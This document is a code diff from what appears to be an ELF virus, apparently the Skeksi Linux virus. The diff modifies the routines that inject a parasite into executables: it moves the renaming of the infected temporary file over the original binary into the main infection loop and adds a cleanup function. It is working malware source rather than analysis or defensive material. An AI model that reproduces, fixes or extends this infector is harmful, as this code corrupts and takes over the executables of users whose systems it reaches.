@@ -59,7 +59,6 @@ unsigned long get_rip(void);
 void end_code(void);
 void dummy_marker(void);
 
-
 #if defined(DEBUG) && DEBUG > 0
  #define DEBUG_PRINT(fmt, args...) _printf("DEBUG: %s:%d:%s(): " fmt, \
     __FILE__, __LINE__, __func__, ##args)
@@ -72,7 +71,7 @@ void dummy_marker(void);
 #define PAGE_ROUND(x) (PAGE_ALIGN_UP(x))
 #define STACK_SIZE 0x4000000
 
-#define TMP "/tmp/.xyz.skeksi.elf64"
+#define TMP ".xyz.skeksi.elf64"
 
 #define LUCKY_NUMBER 7
 #define MAGIC_NUMBER 0x15D25 //thankz Mr. h0ffman
@@ -280,15 +279,8 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
         unsigned int final_length = st.st_size - (sizeof(ElfW(Ehdr))); // + target->ehdr->e_shnum * sizeof(Elf64_Shdr));
         if ((c = _write(ofd, mem, final_length)) != final_length) 
 		return -1;
-        _fsync(ofd);
+
 	_close(ofd);
- 	if (_close(target->fd) < 0)
-		DEBUG_PRINT("close failed\n");
-       	if (_munmap(target->mem, target->size) < 0)
-		DEBUG_PRINT("munmap failed\n");
-	_rename(TMP, target->path);
-         if (_rename(TMP, target->path) < 0)
-                DEBUG_PRINT("rename failed\n");
 
 	return 0;
 }
@@ -306,18 +298,12 @@ int infect_elf_file(elfbin_t *self, elfbin_t *target)
 	size_t parasiteSize;
 	size_t paddingSize;
 	struct stat st;
-	
+	char *host = target->path;
 	/*
 	 * Get size of parasite (self)
 	 */
         parasiteSize = self->size;
-	
-	DEBUG_PRINT("parasiteSize: %d\n", parasiteSize);
-	
 	paddingSize = PAGE_ALIGN_UP(parasiteSize + JMPCODE_LEN);
-	
-	DEBUG_PRINT("paddingSize: %d\n", paddingSize);
-	
 	
 	mem = target->mem;
 	ehdr = (Elf64_Ehdr *)target->ehdr;
@@ -365,7 +351,8 @@ int infect_elf_file(elfbin_t *self, elfbin_t *target)
 	ehdr->e_phoff += paddingSize;
 
 	inject_parasite(parasiteSize, paddingSize, target, self, orig_entry_point);
-
+	
+	return 0;
 }
 /*
  * Since our parasite exists of both a text and data segment
@@ -386,6 +373,12 @@ int load_self(elfbin_t *elf)
 	elf->size += 1000;
 #endif
 	return 0;
+}
+
+void unload_target(elfbin_t *elf)
+{
+	_munmap(elf->mem, elf->size);
+	_close(elf->fd);
 }
 
 int load_target(const char *path, elfbin_t *elf)
@@ -523,6 +516,8 @@ void do_main(struct bootstrap_data *bootstrap)
 			
 			load_target(fpath, &target);
 			infect_elf_file(&self, &target);
+			unload_target(&target);
+			_rename(TMP, fpath);
 		}
 		
 	}
